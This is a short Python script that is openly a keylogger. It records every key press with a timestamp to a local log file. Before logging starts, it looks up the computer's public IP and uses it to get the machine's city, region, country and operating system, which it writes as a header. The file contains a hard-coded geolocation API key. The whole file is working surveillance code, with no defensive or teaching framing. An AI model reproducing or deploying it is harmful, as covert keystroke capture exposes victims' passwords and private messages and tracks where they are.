from pynput.keyboard import Listener
from datetime import datetime
import platform
import requests

# Replace 'YOUR_API_KEY' with your actual API key
API_KEY = '09aaa0308ab2ad6e0f04f2281c558988'

# Get current timestamp
def get_timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# Get platform information
def get_platform():
    return platform.system() + " " + platform.release()

# Function to get public IP address of the computer
def get_public_ip():
    response = requests.get('https://api.ipify.org?format=json')
    data = response.json()
    return data['ip']

# Function to get location information based on IP address
def get_location(ip_address):
    url = f'http://api.ipstack.com/{ip_address}?access_key={API_KEY}'
    response = requests.get(url)
    data = response.json()
    return data

# Write location header to the log file
def write_location_header(location):
    with open("log.txt", "a") as file:
        file.write(f"Location: {location}\n\n")

# Callback function to handle key presses
def on_press(key):
    with open("log.txt", "a") as file:
        file.write(f"[{get_timestamp()}] Key '{key}' pressed\n")

# Get location information and write it as the header in the log file
ip_address = get_public_ip()
location_data = get_location(ip_address)
location = f"{location_data.get('city', '')}, {location_data.get('region_name', '')}, {location_data.get('country_name', '')} on {get_platform()}"
write_location_header(location)

# Start the keylogger
with Listener(on_press=on_press) as listener:
    listener.join()
